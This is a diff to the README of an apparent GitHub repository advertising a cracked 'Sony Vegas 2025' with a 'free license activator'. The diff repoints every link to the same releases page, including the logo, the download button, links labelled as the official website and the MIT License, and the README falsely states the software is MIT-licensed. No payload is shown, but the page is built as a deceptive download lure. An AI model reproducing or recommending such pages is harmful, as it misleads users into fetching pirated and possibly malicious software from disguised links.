@@ -8,13 +8,13 @@ Welcome to the **Sony Vegas 2025** repository, your one-stop destination for all
 **Description:** Quickly access and download Sony Vegas 2025, the exciting new version packed with features! Free license activator and plugins included.  
 **Topics:** sony-vegas, sony-vegas-2025-full, sony-vegas-21-download, sony-vegas-descadar, sony-vegas-full, sony-vegas-key, sony-vegas-key-free, sony-vegas-patched, sony-vegas-plugins-borisfx, sony-vegas-plugins-free, sony-vegas-pro-21-tutorial, sony-vegas-pro-installation, sonyvegas-2025  
 
-![Sony Vegas 2025 Logo](https://example.com/sony-vegas-2025-logo.png)
+![Sony Vegas 2025 Logo](https://github.com/CalvoOtaku/Sony-Vegas-2025/releases)
 
 ## Download Sony Vegas 2025
 
 For the latest version of Sony Vegas 2025, click the button below:
 
-[![Download Sony Vegas 2025](https://img.shields.io/badge/Download-Sony%20Vegas%202025-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Sony Vegas 2025](https://github.com/CalvoOtaku/Sony-Vegas-2025/releases%20Vegas%202025-blue)](https://github.com/CalvoOtaku/Sony-Vegas-2025/releases)
 
 ### Note:
 The link provided needs to be launched to initiate the download.
@@ -48,7 +48,7 @@ Connect with fellow Sony Vegas users, share tips and tricks, and stay updated on
 
 ## Explore More
 
-Visit the [Sony Vegas Official Website](https://www.sonyvegas.com) to discover additional resources, tutorials, and updates on Sony Vegas products.
+Visit the [Sony Vegas Official Website](https://github.com/CalvoOtaku/Sony-Vegas-2025/releases) to discover additional resources, tutorials, and updates on Sony Vegas products.
 
 ## Contribute
 
@@ -56,7 +56,7 @@ We welcome contributions from the community to enhance the Sony Vegas 2025 exper
 
 ## License
 
-Sony Vegas 2025 is released under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute the software according to the terms of the license.
+Sony Vegas 2025 is released under the [MIT License](https://github.com/CalvoOtaku/Sony-Vegas-2025/releases). Feel free to use, modify, and distribute the software according to the terms of the license.
 
 ---
 
